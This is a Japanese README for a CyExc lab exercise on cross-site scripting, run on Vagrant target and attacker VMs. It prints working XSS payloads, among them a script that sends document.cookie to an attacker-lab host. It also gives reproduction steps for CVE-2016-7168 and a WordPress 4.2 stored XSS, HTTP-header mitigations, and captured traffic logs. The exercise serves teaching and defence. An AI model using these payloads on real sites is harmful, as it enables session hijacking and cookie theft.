# クロスサイトスクリプティングの脆弱性攻撃演習について
## Motivation
攻撃者 (Attacker) がクロスサイトスクリプティング（XSS）の脆弱性を持つ、不正スクリプトを含んだ動的ウェブサイト (Target) にユーザを誘導することにより、このサイトにアクセスしたユーザのブラウザ環境で不正スクリプトが実行される。XSSによる攻撃や情報漏洩が現実社会においてどのように発生するかを理解することは重要である。

## 学習目標
CyExcが提供する本演習では、XSSの脆弱性やこれが利用された攻撃の手法や脅威の理解を目的とし、次の演習を行う。
* XSSによるクッキー情報の窃取
* Apache2でのXSSプロテクションの有効化
* WordPress version4.2を用いたCVE-2016-7168とWordPress 4.2 Stored XSSの事象の再現
本演習ではVagrantにTargetとAttackerの2つのゲストOSを構築した環境を提供する。proxyサーバ（Apache2）は攻撃対象のウェブサーバ内に構築している。

クッキー取得やウェブ ShellのPHPコードは情報倫理の観点から、CyExcでの公開または提供は行わないものとする。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/block.png" title="Ex3演習環境構成図">

## Prerequisite
* Vagrant
  * Plugin: landrush, vagrant-vbguest

## Installation　　
* Vagrant　　　
1. $ vagrant up --provision　　　   
2. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
```
target.cyexc-target            192.168.33.10
10.33.168.192.in-addr.arpa     target.cyexc-target
attacker.cyexc-attacker        192.168.33.20
20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
````
3. target側のOS起動
$ vagrant ssh target  <br>
	i. $ cd target/　　　    <br>
	ii.$ sudo docker-compose up --build  <br>
4. attacker側のOS起動
$ vagrant ssh attacker  <br>
	i. $ cd attacker/　　　      <br>
	ii.$ sudo docker-compose up --build  <br>

## シナリオ1
Target OSに設置されたウェブサーバは入力された文字列を表示するサイトを公開している。Attacker OSからこのウェブサイトにアクセスし、不正な入力を含むリクエストを送信し、このウェブサイトのクッキー情報が窃取されたことを確認する。

### Steps
1. ht&#8203;tp://target.cyexc-target:8000/php/xss.phpにアクセスする。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/xss.png" title="Screenshot1">
2. `"><script>alert(document.cookie)</script><!--`を入力する。
クッキー情報がポップアップ表示される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie1.png" title="Screenshot2">
3. `"><script>window.location='http://attacker.cyexc-attacker:8081/cookie.php?c='+document.cookie;</script><!--`を入力する。
Attacker OSのクッキー情報を窃取するPHPコード（cookie.php）が実行される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie2.png" title="Screenshot3">

窃取した攻撃対象のウェブサイトのクッキー情報はこちら＠[index.html](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/index.html)

### 脅威
Attackerが不正なスクリプトを攻撃に利用するXSSの脆弱性を持ったウェブサイトに埋め込むことで、攻撃対象のウェブサイトを訪れたユーザのクッキー情報を窃取できる。クッキーはウェブサイト側が訪問者を識別するための番号であり、クッキーを用いてアカウント情報などを閲覧することができる。XSSはセッションハイジャックの前段階攻撃となる。
また、セッションハイジャック以外にも、フォームの入力内容の窃取、ユーザを外部の悪質なページにリダイレクトさせるなどの行為がXSSの脅威となる。

### curlコマンド
HTTPアクセスしてコンテンツを取得することができる。-Iオプションを使うと、HTTPリクエストのレスポンスヘッダを取得することができる。
```
Usage: curl [options...] <url>
Options: (H) means HTTP/HTTPS only, (F) means FTP only
```
* 例）www.google.comのHTTPレスポンスヘッダを取得
```
vagrant@attacker:~$ curl -I http://www.google.com
HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Location: http://www.google.co.jp/?gfe_rd=cr&dcr=0&ei=2Vh0WvGGCO7d8Af_l5LoCA
Content-Length: 271
Date: Fri, 02 Feb 2018 12:26:01 GMT
```

### HTTPヘッダー
アプリケーションですべてのXSS欠陥を防ぐことは困難なため、OWASPはウェブサイトでXSS欠陥の影響を軽減するためのHTTPヘッダーの設定を推奨している。どのような効果があるか、curlコマンドを使って確認する。

#### HttpOnly Cookieフラグの使用
このフラグを設定すると、クッキーヘッダ以外から読み取ることができなくなり、JavaScriptからの参照を防ぐことができる。

#### X-XSS-Protectionレスポンスヘッダの使用
ウェブブラウザに装備されているXSSフィルタ機能を有効にすることができる。

#### Apache2の設定方法
1. wordpressコンテナにログイン
```
apache2vagrant@target:~/target$ sudo docker-compose exec wordpress bash
```
2. apache2にmod_headersを追加する。
```
root@a4ff20247d20:~# a2enmod headers
root@a4ff20247d20:~# service apache2 restart
```
3. 再度1. wordpressコンテナにログイン
```
apache2vagrant@target:~/target$ sudo docker-compose exec wordpress bash
```
4. /etc/apache2/conf-available/security.confに以下の設定を追加する。
    * `Header set X-XSS-Protection "1; mode=block"`
    * `Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure`

```
root@a4ff20247d20:/var/www/html# vi /etc/apache2/conf-available/security.conf
root@a4ff20247d20:/var/www/html# service apache2 restart
```

設定前
```
vagrant@attacker:~$ curl -I http://target.cyexc-target:8000/php/xss.php
HTTP/1.1 200 OK
Date: Fri, 02 Feb 2018 12:27:47 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.33
Set-Cookie: PHPSESSID=ee9b5e67f350fe2de2ceec06e26684f1; path=/**
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

設定後
```
vagrant@attacker:~$ curl -I http://target.cyexc-target:8000/php/xss.php
HTTP/1.1 200 OK
Date: Fri, 02 Feb 2018 12:34:32 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Set-Cookie: PHPSESSID=17b07d99c8a5e7852286454dba8d115e; path=/;HttpOnly;Secure
Content-Type: text/html; charset=UTF-8
```

## シナリオ2
Target OSに設置されたWordPressサーバに不正な入力を含むリクエストを送信し、CVE-2016-7168とWordPress 4.2 Stored XSSの事象を確認する。

### CVE-2016-7168事象
CVE-2016-7168は、XSSコードが含まれている画像ファイル名におけるWordPressの重大なXSSの脆弱性である。

### Steps
1. Browse to http://target.cyexc-target:8000
2. ファイル名にXSSコードが含まれている画像をWordPress記事に添付する。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/post.png" title="Screenshot4">
3. プレビュー画面に遷移する。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/CVE-2016-7168.png" title="Screenshot5">

### WordPress 4.2 Stored XSS事象
WordPress 4.2 Stored XSSは、WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿することで、コメント欄を表示したTarget OSのブラウザ上で任意のJavaScriptを実行することができる。

### Steps
1. Browse to http://target.cyexc-target:8000
2. WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿する。
`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
64KB以上の文字列は下記のようなPythonスクリプトで作成した。
```
print 'A' * (64*1024 + 1)
```
確認ではWEB ShellコードをGETするXSSコード設置した。WordPressサーバに不正なスクリプトが設置される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/4_2_XSS.png" title="Screenshot6">

#### wordpressサーバでHTTP通信をキャプチャ
1. wordpressコンテナにログイン
```
vagrant@target:~/target/wordpress$ sudo docker-compose exec wordpress bash
```
2. ngrepを使用してHTTP通信をキャプチャ
```
root@64ff6b86f93b:/var/www/html# ngrep -W byline 'HTTP' -q > ngrep.log
```
3. wordpressコンテナをログアウト
4. wordpressコンテナのcontainer IDを調べる
```
vagrant@target:~/target/wordpress$ sudo docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
64ff6b86f93b        mywp                "/usr/local/bin/dock…"   13 minutes ago      Up 13 minutes       0.0.0.0:8000->80/tcp   target_wordpress_1
5b396b4d2bd0        mysql:5.7           "docker-entrypoint.s…"   2 hours ago         Up 13 minutes       3306/tcp               target_db_1
```
5. 取得したngrepのログをTarget OSにコピー
```
vagrant@target:~/target/wordpress$ sudo docker cp 64ff6b86f93b:/var/www/html/ngrep.log .
```

### CVE-2016-7168の確認
* XSSコードが含まれている画像のアップロード
T 192.168.33.1:60465 -> 192.168.1.10:80 [AP]
GET /wp-content/uploads/2018/02/img-srca-onerroralertdocument.cookie-300x300.png HTTP/1.1
Host: target.cyexc-target:8000.

* XSSコードが含まれている画像ファイル名が動的WEBページに紛れ込んでいることがわかる。
T 192.168.33.1:60475 -> 192.168.1.10:80 [A]
POST /wp-admin/async-upload.php HTTP/1.1.
Host: target.cyexc-target:8000.
Content-Type: multipart/form-data; boundary=---------------------------119484861102225031902156995.
Cookie: wp-saving-post=4-check; wordpress_90d5ca9d152667cf01931c7af43d449d=admin%7C1517746831%7C3lnjB9FzHVQ2di2eXuIxgsUSODN2ewsjPvk7NRZBlCz%7Cc5f6ca4e502585ad989c59e1335e0a1c6e9fedf65fdb0795a4f862b31805c454; wp-settings-time-1=1517579032; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26urlbutton%3Dpost; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_90d5ca9d152667cf01931c7af43d449d=admin%7C1517746831%7C3lnjB9FzHVQ2di2eXuIxgsUSODN2ewsjPvk7NRZBlCz%7Ca6730f416c68fb6d6713bf188f5d7b056bc2f8cabf3bb8b58e0c0ecccfd96bd6; PHPSESSID=62b5fe7e3928dd77f90bde1a505db58e.
Connection: keep-alive.
.
-----------------------------119484861102225031902156995.
Content-Disposition: form-data; name="name".
.
**<img src=a onerror=alert(document.cookie)>.png.**

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/ngrep2.log)


## References
* [Corss-site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
* [XSS対策チートシート](https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSPrevention.html)
* [CVE-2016-7168](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168)
* [WordPress - Authenticated Stored Cross-Site Scripting via Image Filename](https://wpvulndb.com/vulnerabilities/8615)
* [WordPress 4.2 Stored XSS](https://klikki.fi/adv/wordpress2.html)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
